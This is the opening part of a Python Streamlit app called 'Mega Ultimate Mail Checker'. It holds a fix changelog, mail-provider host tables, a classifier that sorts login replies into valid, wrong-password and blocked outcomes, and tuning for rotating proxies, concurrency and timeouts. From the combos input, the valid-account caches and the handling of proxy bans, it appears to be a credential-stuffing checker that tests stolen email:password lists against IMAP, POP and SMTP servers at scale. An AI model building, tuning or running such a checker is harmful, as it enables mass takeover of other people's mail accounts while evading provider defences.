# @@FILE app.py blocks=111 version=v13.48
# @@BLOCK 000 FILE_HEADER deps=-
"""
Mega Ultimate Mail Checker - v13.48  (BLOCK EDITION)
====================================================
Full version history lives in CHANGELOG.md.

HOW THIS FILE IS ORGANISED
--------------------------
Every section is a NAMED, NUMBERED, REPLACEABLE BLOCK:

    # @@BLOCK 016 PROXY_407_CONTRACT deps=-
    ...
    # @@END 016 PROXY_407_CONTRACT

* To change behaviour, REPLACE A WHOLE BLOCK - never edit inside one.
* The @@BLOCK / @@END lines are part of the contract. Keep the id and the
  NAME byte-for-byte, and keep the block ids ascending.
* `python verify_blocks.py` proves the frame: ids contiguous, every block
  closed, deps earlier, nothing between blocks, no non-ASCII outside a
  comment or a string, and the file still compiles.
* `deps=` lists what a block reads from. If you change the names a block
  PUBLISHES, every dependent block must be re-issued too.
* Blocks 000..110 in ascending order ARE the execution order.

FIX LEDGER (every entry names the block it lands in)
----------------------------------------------------
P0-1  a WRONG verdict returned on rung 1 on any domain with a single local
      host: the confirmation pool counted only LOCAL hosts and the current
      host was already in tried_hosts.                     [101]
P0-2  allow_direct was latched BEFORE the proxy phase, so in Proxy Mode =
      aggressive with Retry CF off a 407-flooded proxy phase could never
      fall through to DIRECT.                              [103]
P0-3  status.py tested the greedy _APP_PASSWORD tokens (oauth / tenant /
      consent / mfa / 2fa) BEFORE _WRONG_STRONG, and _RETRY owned
      backend / upstream / downstream / unavailable.       [status.py 006, 007]
P0-4  the duplicate WRONG block after the first return in
      _handle_app_or_wrong was unreachable dead code and broke
      verify_v1337.py.                                     [101]
P0-5  block 024 seeded both valid caches WITHOUT a "user" key, so block 037's
      `"user": ""` defaults were dead code and a fresh process answered None
      to every owner comparison.                           [024, 037]
P0-6  the STATE-backed cache gate asserted a SINGLE-LINE substring, so wrapping
      the alias turned verify_v1337.py red on a pure reflow - and
      _PREV_VALID_CACHE was not gated at all. The gate is whitespace-blind
      now.                                                 [verify_v1337.py]
P1-1  only valid_results was rehydrated from disk, so a session reset wiped
      every other bucket and every log.                    [037]
P1-2  the combos text_area and the file uploader had no key=, so a paste
      could vanish on a rerun.                             [037]
P1-3  build_diagnostics_text() ran on EVERY rerun inside a collapsed
      expander.                                            [081]
P1-4  the per-account report dataframe was rebuilt every 0.12s. [106]
P2-1  PROXY_407_FORCE_DIRECT 3 -> 2, and the same-node 407 retry now needs
      real window left instead of 3s.                      [016, 102]
P2-2  [data-testid="stHeader"]{height:2.1rem} fought Streamlit's own header;
      [data-testid="stSidebar"] * clobbered sidebar icons. [032]
P2-3  the 13-metric rows collided on a phone.              [035]

NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
proxies.txt / Streamlit secrets / live DNS / live ip-api.
"""
# @@END 000 FILE_HEADER

# @@BLOCK 001 IMPORTS deps=-
import base64
import glob
import html
import imaplib
# Raise the default 1 MB line limit so large SEARCH responses do not abort.
# A mailbox with tens of thousands of messages can return a SEARCH line longer than 1 MB.
imaplib.IMAP4.maxline = 10_000_000
import json
import os
import platform
import poplib
import random
import re
import socket
import ssl
import sys
import threading
import time
import warnings
import zipfile
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import List
from urllib.parse import urlparse

import pandas as pd
import streamlit as str_lit
# @@END 001 IMPORTS

# @@BLOCK 002 HOSTS_IMPORT_FALLBACK deps=-
HOSTS_OK = True
HOSTS_HAS_RANKING = True
HOSTS_IMPORT_NOTE = ""

try:
    from hosts import (conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT,
                       MS_DOMAINS, GMAIL_DOMAINS,
                       smtp_candidates as host_smtp_candidates)
except Exception as _hosts_core_err:
    HOSTS_OK = False
    HOSTS_IMPORT_NOTE = (f"hosts.py core import failed ({_hosts_core_err}); "
                         f"using built-in tables.")
    STRICT_APP = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com",
                  "live.com", "windowslive.com"}
    ZERO_ACCESS = {"proton.me", "protonmail.com", "pm.me", "tuta.io",
                   "tutanota.com", "tutamail.com", "tuta.com"}
    PARENT = {"memoad.jp": "biglobe.ne.jp"}
    MS_DOMAINS = {"outlook.com", "hotmail.com", "live.com", "msn.com", "hotmail.co.uk"}
    GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}

    def host_smtp_candidates(domain):
        return []

    _BB_STATIC_CONF = {
        "gmail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "googlemail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "outlook.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "hotmail.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "live.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "msn.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "yahoo.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "ymail.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btinternet.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "bt.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btopenworld.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "talk21.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "sky.com": (["imap.tools.sky.com"], ["imap.tools.sky.com"]),
        "virginmedia.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "ntlworld.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "blueyonder.co.uk": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "aol.com": (["imap.aol.com"], ["pop.aol.com"]),
        "icloud.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "me.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "zoho.com": (["imap.zoho.com"], ["pop.zoho.com"]),
        "gmx.net": (["imap.gmx.net"], ["pop.gmx.net"]),
        "gmx.de": (["imap.gmx.net"], ["pop.gmx.net"]),
        "web.de": (["imap.web.de"], ["pop3.web.de"]),
        "t-online.de": (["secureimap.t-online.de"], ["securepop.t-online.de"]),
        "freenet.de": (["imap.freenet.de"], ["pop.freenet.de"]),
        "free.fr": (["imap.free.fr"], ["pop.free.fr"]),
        "orange.fr": (["imap.orange.fr"], ["pop.orange.fr"]),
        "qq.com": (["imap.qq.com"], ["pop.qq.com"]),
        "naver.com": (["imap.naver.com"], ["pop.naver.com"]),
    }

    def host_conf(domain):
        domain = (domain or "").lower().strip()
        if domain in ZERO_ACCESS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
        got = _BB_STATIC_CONF.get(domain)
        if got:
            return {"imap": list(got[0]), "pop": list(got[1]), "pop3": list(got[1])}
        return None
# @@END 002 HOSTS_IMPORT_FALLBACK

# @@BLOCK 003 HOSTS_RANK_FALLBACK deps=-
try:
    from hosts import rank_hosts as host_rank_hosts, is_junk_host as host_is_junk
except Exception as _hosts_rank_err:
    HOSTS_HAS_RANKING = False
    _note = (f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); "
             f"using built-in ranking.")
    HOSTS_IMPORT_NOTE = (HOSTS_IMPORT_NOTE + " " + _note).strip() if HOSTS_IMPORT_NOTE else _note

    _BB_ROUTER_LABEL_EXACT = re.compile(
        r"^(?:"
        r"mx|mx\d+|mta|mtas|mta\d+|smtp|smtps|smtpout|smtp-in|smtp-out|"
        r"inbound|outbound|relay|relay\d+|spool|filter|filters|cluster|clust\d+|"
        r"edge|edge\d+|gateway|gw|gw\d+|router|mailrouter|aspmx|aspmx\d*|"
        r"alt\d+|protection|hs|lb|"
        r"mx-aol|mx-aol\.mail|mx\.google|eur\.olc|olc\.protection"
        r")$"
    )
    _BB_ROUTER_TOKENS = (
        "mta", "smtp", "relay", "inbound", "outbound", "spool",
        "filter", "cluster", "mailrouter", "olc.protection",
        "protection.outlook", "aspmx", "gateway",
    )
    _BB_SERVICE_PREFIXES = (
        "imap", "imaps", "imap2", "mail", "mail2", "pop", "pop3", "pop3s",
        "webmail", "webmail2", "email", "correo", "zimbra", "zcs",
        "secure", "ssl", "outlook", "exchange", "owa",
    )
    _BB_SKIP_LABELS = {"mail", "email", "webmail", "imap", "imaps", "pop",
                       "pop3", "smtp", "correo"}

    def host_is_junk(host, domain=None):
        h = (host or "").lower().strip().strip(".")
        if not h:
            return True
        if domain and h == (domain or "").lower().strip():
            return True
        labels = h.split(".")
        if len(labels) < 2:
            return False
        for lab in labels[:-1]:
            if _BB_ROUTER_LABEL_EXACT.match(lab):
                return True
        for lab in labels[:-1]:
            if lab in _BB_SKIP_LABELS:
                continue
            if any(tok in lab for tok in _BB_ROUTER_TOKENS):
                return True
            if re.search(r"(?:^|[-_])mx\d*(?:$|[-_])", lab):
                return True
        return False

    def _bb_tier(host, domain):
        h = (host or "").lower().strip().strip(".")
        d = (domain or "").lower().strip().strip(".")
        if not h:
            return 4
        if d and h == d:
            return 3
        if d and h.endswith("." + d):
            if host_is_junk(h, d):
                return 3
            if h[: -(len(d) + 1)].split(".")[0] in _BB_SERVICE_PREFIXES:
                return 0
            return 1
        if host_is_junk(h, d):
            return 3
        return 2

    def _bb_resolves(host):
        try:
            socket.getaddrinfo(host, None)
            return True
        except Exception:
            return False

    _bb_probe_lock = threading.Lock()
    _bb_probe_cache = {}
    _BB_PROBE_TTL = 600

    def _bb_port_open(host, port, timeout=1.5):
        try:
            _s = socket.create_connection((host, port), timeout=timeout)
            _s.close()
            return True
        except Exception:
            return False

    def _bb_probe(host):
        if not host:
            return False
        now = time.time()
        with _bb_probe_lock:
            hit = _bb_probe_cache.get(host)
            if hit and now - hit[0] < _BB_PROBE_TTL:
                return hit[1]
        ok = _bb_port_open(host, 993) or _bb_port_open(host, 143)
        with _bb_probe_lock:
            _bb_probe_cache[host] = (now, ok)
        return ok

    def host_rank_hosts(hosts, domain, probe=True):
        hosts = [h for h in (hosts or []) if h]
        if not hosts:
            return []
        indexed = list(enumerate(hosts))
        if not probe:
            indexed.sort(key=lambda t: (0 if _bb_resolves(t[1]) else 1,
                                        _bb_tier(t[1], domain), t[0]))
            return [h for _i, h in indexed]
        tiers = {h: _bb_tier(h, domain) for h in set(hosts)}
        resolves = {h: _bb_resolves(h) for h in set(hosts)}
        to_probe = [h for h in dict.fromkeys(hosts) if tiers[h] <= 1 and resolves[h]][:6]
        live = {}
        if to_probe:
            try:
                with ThreadPoolExecutor(max_workers=min(6, len(to_probe))) as ex:
                    futs = {ex.submit(_bb_probe, h): h for h in to_probe}
                    for fut in as_completed(futs, timeout=6):
                        h = futs[fut]
                        try:
                            live[h] = fut.result()
                        except Exception:
                            live[h] = False
            except Exception:
                pass
        indexed.sort(key=lambda t: (
            0 if resolves.get(t[1], False) else 1,
            tiers.get(t[1], 4),
            0 if live.get(t[1], False) else 1,
            t[0],
        ))
        return [h for _i, h in indexed]

# --- v13.25: delegate host merging to hosts.py so FAMILY_PRIORITY applies ---
try:
    from hosts import (merge_domain_guesses as _hosts_merge_guesses,
                       _family_priority as _hosts_family_priority)
    _HAVE_HOSTS_MERGE = True
except Exception:
    _HAVE_HOSTS_MERGE = False
# @@END 003 HOSTS_RANK_FALLBACK

# @@BLOCK 004 STATUS_IMPORT_FALLBACK deps=-
try:
    from status import (
        VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
        FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
        SKIP, SKIPPED_COOLDOWN, UNKNOWN,
        RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
        LOGIN_DROPPED,
        classify_error as st_classify, is_proxy_level_error as st_proxy_level,
        display as st_display, color as st_color,
    )
    STATUS_OK = True
    STATUS_IMPORT_NOTE = "status.py loaded (real classifier active)."
except Exception as _status_err:
    STATUS_OK = False
    STATUS_IMPORT_NOTE = f"status.py import failed ({_status_err}); using inline fallback."
    warnings.warn(STATUS_IMPORT_NOTE)
    VALID = "valid"
    WRONG = WRONG_PASSWORD = "wrong_password"
    APP = NEED_APP_PASSWORD = "need_app_password"
    FAILED = CONNECTION_FAILED = "connection_failed"
    PROXY_UNHEALTHY = "proxy_unhealthy"
    SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
    UNKNOWN = "unknown"
    RETRY = RETRY_LATER = "retry_later"
    RBL = RBL_BLOCKED = "rbl_blocked"
    SMTP_FAILED = "smtp_failed"
    DNS_FAILED = "dns_failed"
    LOGIN_DROPPED = "login_dropped"
    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, LOGIN_DROPPED, RETRY_LATER,
              RBL_BLOCKED, SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED,
              PROXY_UNHEALTHY, UNKNOWN, SKIPPED_COOLDOWN]
    ST_LABELS = {s: s.upper() for s in ST_ALL}
    ST_COLORS = {
        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", LOGIN_DROPPED: "#f43f5e",
        CONNECTION_FAILED: "#eab308", PROXY_UNHEALTHY: "#e879f9",
        NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
        SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
        SKIPPED_COOLDOWN: "#a78bfa",
    }
    ST_PRIORITY = {
        VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
        LOGIN_DROPPED: 4, RETRY_LATER: 5, SMTP_FAILED: 6, DNS_FAILED: 7,
        CONNECTION_FAILED: 8, PROXY_UNHEALTHY: 9, UNKNOWN: 10, SKIPPED_COOLDOWN: 11,
    }

    # FIX P0-3: order mirrors status.py - WRONG_STRONG before the greedy APP
    # tokens, and _RETRY no longer owns backend/upstream/downstream.
    _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                        "authentication failed", "invalid credentials",
                        "invalid user name or password", "login incorrect",
                        "wrong password", "authenticate error",
                        "invalid login or password",
                        "logowanie nie powiodlo sie",
                        "sprawdz dane logowania",
                        "nieprawidlowe haslo",
                        "bledne haslo")
    _FB_APP = ("app password", "application specific password",
               "application-specific password", "app-specific password",
               "basic authentication is disabled", "basic auth is disabled",
               "basicauthenticationdisabled", "web login required",
               "via your web browser", "less secure app", "lesssecureapp",
               "oauth", "oauth2", "token required", "an app password is required",
               "use an app password", "enable imap", "imap access is disabled",
               "imap is disabled", "pop access is disabled", "enable pop",
               "2fa", "2-step", "2 step", "mfa", "multi-factor", "multi factor",
               "two-factor", "two factor", "modern authentication",
               "sign in with", "log in with your browser", "consent", "tenant",
               "aadsts50076", "aadsts50079", "aadsts50074", "strongauth",
               "required new password",
               "aktywuj dostep przez imap")
    _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
               "blacklist", "blacklisted", "ip blocked")
    _FB_DNS = ("does not resolve", "failed to resolve", "name or service not known",
               "nodename nor servname", "getaddrinfo", "gaierror",
               "no address associated", "temporary failure in name resolution",
               "nxdomain", "servfail")
    _FB_RETRY_HARD = ("too many", "limit", "quota", "busy", "throttle",
                      "rate limit", "try again", "temporarily unavailable")
    _FB_SERVER_DROP = ("terminating connection", "imap server terminating",
                       "server terminating", "* bye", " bye ", "bye ",
                       "auth process broken", "connection is closed",
                       "server closed the connection", "server dropped the connection")
    _FB_CONN_STRONG = ("connection reset by peer", "connection reset", "reset by peer",
                       "connection refused", "connection aborted", "connection closed",
                       "connection dropped", "connection lost", "connection failure",
                       "broken pipe", "unexpected eof", "eof occurred", "socket error",
                       "socket closed", "socket timeout", "bad file descriptor",
                       "network is unreachable", "no route to host", "host is down",
                       "timed out", "timeout", "timedout", "ssl", "tls",
                       "wrong version number", "handshake", "certificate",
                       "cert verify", "cannot connect", "unable to connect",
                       "failed to connect", "connect failed", "negotiation failure",
                       "not supported by server", "stls not supported",
                       "starttls not supported", "tls not supported", "imap4rev1")
    _FB_RETRY = ("lookup failed", "user could not be routed", "could not route",
                 "retry", "try again", "temporarily unavailable", "temporary failure",
                 "service unavailable", "server busy", "too many", "rate limit",
                 "ratelimit", "throttle", "throttled", "over quota", "quota exceeded",
                 "mailbox full", "system busy", "try later", "unavailable",
                 "authentication services unavailable", "greylist", "greylisted",
                 "unexpected extra arguments")
    _FB_CONN = ("407", "proxy authentication", "proxy auth", "proxyconnect",
                "proxy connect", "proxy route", "bad proxy format", "proxy", "socks")
    _FB_WRONG = ("authenticate failed", "authentication error", "auth failed",
                 "auth failure", "invalid credential", "invalid login",
                 "invalid password", "invalid user", "invalid username",
                 "invalid user name", "invalid account", "login failed",
                 "login failure", "login returned non-ok", "login non-ok",
                 "login error", "password incorrect", "password invalid",
                 "incorrect password", "realmless", "auth error", "[auth]",
                 "authentication", "not authenticated", "bad credentials",
                 "bad username", "bad password", "logon failure",
                 "username and password not accepted", "user rejected",
                 "password rejected", "invalid token", "expired token",
                 "internal server error", "535")
    _FB_BARE = ("login", "logon", "auth", "authenticate", "authentication",
                "sign in", "signin", "sign-in", "credentials", "invalid")

    def st_classify(raw, domain=""):
        t = (raw or "").strip().lower()
        if not t:
            return UNKNOWN
        if t.strip().rstrip(".:!,;").strip() in _FB_BARE:
            return WRONG_PASSWORD
        for table, val in ((_FB_WRONG_STRONG, WRONG_PASSWORD),
                           (_FB_APP, NEED_APP_PASSWORD),
                           (_FB_RBL, RBL_BLOCKED),
                           (_FB_DNS, DNS_FAILED),
                           (_FB_RETRY_HARD, RETRY_LATER),
                           (_FB_SERVER_DROP, LOGIN_DROPPED),
                           (_FB_CONN_STRONG, CONNECTION_FAILED),
                           (_FB_RETRY, RETRY_LATER),
                           (_FB_CONN, CONNECTION_FAILED),
                           (_FB_WRONG, WRONG_PASSWORD)):
            if any(n in t for n in table):
                return val
        return UNKNOWN

    def st_proxy_level(raw):
        s = (raw or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))

    def st_display(s):
        return ST_LABELS.get(s, s)

    def st_color(s):
        return ST_COLORS.get(s, "#cbd5e1")
# @@END 004 STATUS_IMPORT_FALLBACK

# @@BLOCK 005 MSOAUTH_IMPORT deps=-
try:
    import ms_oauth
    MS_OAUTH_OK = True
except Exception:
    ms_oauth = None
    MS_OAUTH_OK = False

if not MS_OAUTH_OK:
    warnings.warn("ms_oauth.py unavailable; Microsoft accounts will report "
                  "NEED_APP_PASSWORD and never validate without an app password.")
# @@END 005 MSOAUTH_IMPORT

# @@BLOCK 006 OPTIONAL_LIBS deps=-
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

if not SOCKS_OK:
    warnings.warn("PySocks is not installed! SOCKS proxy support disabled. "
                  "Run 'pip install PySocks'.")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
# @@END 006 OPTIONAL_LIBS

# @@BLOCK 007 PAGE_CONFIG deps=-
# MUST be the first Streamlit call in the process.
str_lit.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="collapsed",
)

import importlib

import auth
import runstate

# v13.48: the click/outcome ledger. page() runs BEFORE the gate so even the
# Unlock press is attributed; install() runs AFTER it so the file lands on the
# unlocked prefix and not the anon placeholder. Both must be above the first
# widget - a widget built before install() is invisible to it.
import audit_log

# FIX AU-1 (v13.49): audit_log gained page() at 02:25, two hours AFTER this
# process had already imported it at 00:42, and the process was never restarted.
# `import audit_log` therefore handed back the cached module without page() and
# this line raised AttributeError on EVERY rerun - which also meant install()
# below never ran, so nothing on the page was ever wrapped and the ledger could
# only ever hold the presses left over from before 02:25.
#
# It is the identical sys.modules hazard the two guards below already cover for
# auth and runstate; audit_log was simply the one module left unguarded. Same
# hasattr + reload shape, and both calls are optional, so a reload that also
# fails degrades to "no ledger" instead of a dead page.
if not (hasattr(audit_log, "page") and hasattr(audit_log, "install")):
    try:
        audit_log = importlib.reload(audit_log)
    except Exception:
        pass
if hasattr(audit_log, "page"):
    audit_log.page("app.py")

# A Streamlit rerun re-uses the SAME process, so a module imported before a
# redeploy stays in sys.modules and keeps answering with the OLD shape.  BOTH
# modules need the guard - it was applied to auth and not to runstate, which is
# why runstate.tick() answered AttributeError after a redeploy.  Both guards are
# hasattr(): a bare `auth.fit_panel` expression is picked up by Streamlit's
# magic-write, which routes it through st.help -> ast.parse and can raise
# IndentationError on the enclosing `try:` - and it also dumps a help panel into
# the page above the hero.
if not hasattr(auth, "fit_panel"):
    auth = importlib.reload(auth)
if not hasattr(runstate, "interrupt"):
    runstate = importlib.reload(runstate)

# The passkey gate lives in auth.py so every page shares ONE implementation.
# user_file() is re-exported: default_cfg(), RESULTS_DIR, CLEAN_VALID_FILE and
# every results glob prefix per-user names with the unlocked hash.
user_file = auth.user_file

# require() first, fit() second - the order every page uses. require() stops the
# script while locked, so fit() only runs once the gate has passed.
auth.require(str_lit)
auth.fit(str_lit)

if hasattr(audit_log, "install"):
    audit_log.install(str_lit, "app.py")

# ---- teardown watchdog, and it MUST be after require() ---------------------
# runstate._dir() resolves through auth.user_file(), which is a throwaway
# anon<hex> prefix until the passphrase is unlocked. Called before require() it
# read - and CREATED - anon<hex>_mail_results/ while begin(), progress() and
# finish() all wrote to <hash>_mail_results/, so it could never see the record it
# exists to watch.
#
# run_active is PROCESS state and a rerun tears the script down without running
# the loop's finally, so it is still True on the load after a teardown while the
# loop that owned it is gone. That is the proof, and it is immediate - the old
# path waited 60s for a stale heartbeat and then blamed the watchdog.
#
# STATE is built in block 024, which has NOT run yet at this point, and Streamlit
# hands every rerun a FRESH module namespace - so globals().get("STATE") was
# always None and every isinstance(_st_run, dict) branch below was dead. The flag
# is carried in session_state instead, which survives a rerun.
# cause() is read first so a reason already stamped (the Stop button) is
# preserved instead of being overwritten by the generic text.
_run_was_active = bool(str_lit.session_state.get("run_active"))
if _run_was_active:
    runstate.interrupt(
        runstate.cause()
        or "UI interaction / rerun - the run loop was torn down")
    str_lit.session_state["run_active"] = False
    # FIX ISO-4: STATE does not exist yet, so the runs_active decrement this
    # teardown owes is left on the session and repaid in block 039.
    str_lit.session_state["_run_owed"] = True

# Last-resort sweep for a record with no run_active behind it (a redeploy or a
# full process restart), and it still respects the 60s staleness window.
_rs_path = runstate.tick()
# @@END 007 PAGE_CONFIG

# @@BLOCK 008 BUILD_IDENTITY deps=-
# Bump CFG_VERSION whenever a DEFAULT changes in a way users should inherit.
# v13.54: block 012's probe/proxy concurrency defaults were lowered, but
# CFG_VERSION stays 1348 - verify_v1337.py pins the constant to the @@FILE header
# version (v13.48) and a bump without also moving the header, BUILD_TAG and
# status.py's own version goes red. The new numbers are applied by
# SETTING_DEFAULTS on Reset Defaults, which is the path that actually assigns the
# widget keys.
CFG_VERSION = 1348
BUILD_TAG = "v13.48"
# @@END 008 BUILD_IDENTITY

# @@BLOCK 009 TIMING_CONSTANTS deps=-
DOMAIN_CACHE_TTL = 86400
PROBE_TIMEOUT_DEFAULT = 8.0
PROXY_PRECHECK_TIMEOUT_DEFAULT = 5
CONNECT_FLOOR_DEFAULT = 10.0
READ_FLOOR_DEFAULT = 15.0
CONNECT_FLOOR_MIN = 10.0
READ_FLOOR_MIN = 15.0
ATTEMPT_TIMEOUT_NORMAL = 15
ATTEMPT_TIMEOUT_FAST = 10
ATTEMPT_TIMEOUT_DEEP = 20
DEADLINE_NORMAL = 150.0
DEADLINE_FAST = 60.0
DEADLINE_DEEP = 240.0
WORKERS_NORMAL = 12
WORKERS_FAST = 30
WORKERS_DEEP = 8
# FIX SPEED-1: 8.0 / 1.5 / 15.0 meant a 4-rung account carried a 63s floor and a
# 7-rung one 99s - always. A rung that fails in 200ms does not need 8s of
# headroom, so the floor was pure padding and the Deadline slider could not bite.
RUNG_COST_MIN = 5.0
RUNG_COST_MAX = 12.0
WORK_FLOOR_FACTOR = 1.0
WORK_FLOOR_PAD = 10.0
ROTATE_SETTLE = 0.4
SLOW_RETRY_BACKOFF = 1.2
SAME_HOST_RETRIES_DEFAULT = 1
FAILURE_COOLDOWN_DEFAULT = 45.0
WORKER_FUTURE_PAD = 60
GEO_CACHE_TTL = 600
PROBE_RESULT_TTL = 120
LEGACY_RUNG_TIMEOUT = 8.0
LEGACY_PORTS = (143, 110)
GEO_FAIL_TTL = 300.0
GEO_MIN_INTERVAL = 60.0 / 45.0
# @@END 009 TIMING_CONSTANTS

# @@BLOCK 010 PHASE_FRACTIONS deps=-
# Split of the per-account budget between the proxy phase and the direct phase.
PROXY_PRIMARY_FRAC = 0.40
PROXY_TOTAL_FRAC = 0.58
DIRECT_PRIMARY_FRAC = 0.72
DIRECT_FIRST_DIRECT_PRIMARY_FRAC = 0.35
DIRECT_FIRST_DIRECT_TOTAL_FRAC = 0.55
DIRECT_FIRST_PROXY_START_FRAC = 0.58
# @@END 010 PHASE_FRACTIONS

# @@BLOCK 011 PROTOCOL_CONSTANTS deps=-
PROTOCOL_IMAP = "IMAP"
PROTOCOL_POP = "POP3"
PROTOCOL_SMTP = "SMTP"
PROTOCOL_SIEVE = "ManageSieve"
PROTOCOL_OPTIONS = [PROTOCOL_IMAP, PROTOCOL_POP, PROTOCOL_SMTP, PROTOCOL_SIEVE]
PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP, PROTOCOL_POP]

RUNG_IMAP = "IMAP"
RUNG_POP = "POP"
RUNG_SMTP = "SMTP"
RUNG_SIEVE = "SIEVE"

SMTP_RUNG_PORTS = ((587, "starttls"), (465, "ssl"), (25, "plain"))
SIEVE_PORT = 4190
SMTP_HOST_CAP = 1
# @@END 011 PROTOCOL_CONSTANTS

# @@BLOCK 012 CONCURRENCY_CONSTANTS deps=-
# FIX PERF-1: 4 / 1 / 1 meant a 92-line fetch ran in 23 SERIAL waves. The global
# gate is the real ceiling; the per-IP and per-sub-user gates exist only to stop a
# single node being hammered, so they never needed to be 1.
#
# v13.54: THE PROBE WAS 402-ING ITS OWN POOL. PROBE_WORKERS_BULK was 10 and the
# bulk path ignores the sub-user gate's intent - ten tunnels on one plan is over
# the concurrency cap, and 402 is the answer. A 402 storm then read as a dead pool
# and every account after the first ran on nothing. The probe is now 4 wide
# (bulk) / 3 / 2, and the global tunnel cap is 6. Slower on paper, far fewer 402s.
PROXY_CONCURRENCY_DEFAULT = 6
HOST_CONCURRENCY_DEFAULT = 2
PROXY_IP_CONCURRENCY_DEFAULT = 2
# FIX SUB-1: this was 2, and _limit() floors every gate at its DEFAULT - so the
# slider could be dragged to 1 and the engine still used 2, silently, while the
# help text promised 1. The 407 a provider sends when a sub-user cap is exceeded
# is the whole reason this gate exists, so the floor has to be the value the
# slider offers.
PROXY_SUBUSER_CONCURRENCY_DEFAULT = 1
PROBE_WORKERS_DEFAULT = 3
PROBE_WORKERS_BUSY = 2
PROBE_WORKERS_BULK = 4


def _gate_wait(attempt_to: float) -> float:
    """How long a gate will wait before giving up and barging through."""
    try:
        return max(6.0, float(attempt_to) * 1.5)
    except Exception:
        return 6.0
# @@END 012 CONCURRENCY_CONSTANTS

# @@BLOCK 013 FRUGALITY_CONSTANTS deps=-
PROBER_IDLE_SLEEP = 300.0
PROBER_BUSY_SLEEP = 10.0
PROBER_STALE_WHILE_RUNNING = 300.0
PROBER_IDLE_ENABLED_DEFAULT = False
PROBE_SECOND_SCHEME_DEFAULT = False
PROBE_MAX_TARGETS_DEFAULT = 1
# @@END 013 FRUGALITY_CONSTANTS

# @@BLOCK 014 UI_RENDER_CONSTANTS deps=-
PROBE_BATCH_BUDGET = 120.0
# FIX NOLIMIT-1 (v13.59): a hard ceiling that a bigger pool could not grow past.
# A 3000-line file gets 4s per line of budget, bounded only by this.
PROBE_BATCH_MAX = 3600.0
PROBE_BUDGET_START = 120.0
UI_MIN_INTERVAL = 0.12
# FIX NOLIMIT-2 (v13.63): 40 / 200 / 120 / 5000 were display and retention caps on
# a pool and a queue of thousands, and every one of them was hit by a real run.
#   BUCKET_RENDER_TAIL  200 -> 2000  inline bucket lines
#   LOG_CAP_QUIET       300 -> 2000  execution log kept in session
#   LOG_CAP_DEBUG       500 -> 5000  the same, in Debug Mode
#   REPORT_ENTRIES_MAX 5000 -> 20000 traced accounts
# A cap that silently eats the record is worse than a slower render; the full text
# still leaves by the ZIP, the .txt export and the Full Log page.
#
# v13.70 MEM-1: AND THE RENDER COULD NOT KEEP THE PROMISE. The live report table
# copied the WHOLE deque - list() over 20000 entries, then a dataframe of it, then
# Arrow - once every REPORT_DF_MIN_INTERVAL second, each row carrying a multi-line
# trace. That is ~40 MB of strings plus a ~40 MB Arrow buffer, rebuilt, for the
# whole run, on a 1 GB container. The ring is 3000 now and the TABLE copies only
# _DF_TAIL_LIVE of it. The ZIP, the .txt export and the Full Log page still carry
# every row, so nothing is lost - only the part held in RAM changes.
BUCKET_RENDER_TAIL = 1000
# FIX DELTA-1 (v13.67): THE LIVE LOOP DREW A SEPARATE WIDGET PER LINE, up to
# BUCKET_RENDER_TAIL of them, for twelve buckets, on every UI tick. At
# UI_MIN_INTERVAL that is up to ~200,000 deltas a second at the tail of a run -
# the socket cannot keep up and the browser answers
#   "Failed to process a Websocket message. RangeError: index out of range"
# after which it stops applying deltas: the run continues, the screen freezes.
# The live bucket render is one HTML block per bucket, capped here; the summary
# block still shows the full set and the download buttons carry every line.
BUCKET_LIVE_TAIL = 250
# v13.70 MEM-2: the live snapshot copies exactly this many lines per bucket per
# tick - it used to copy all of them and then draw BUCKET_LIVE_TAIL of each. The
# true count is passed alongside the tail, so the "+N more" line stays honest.
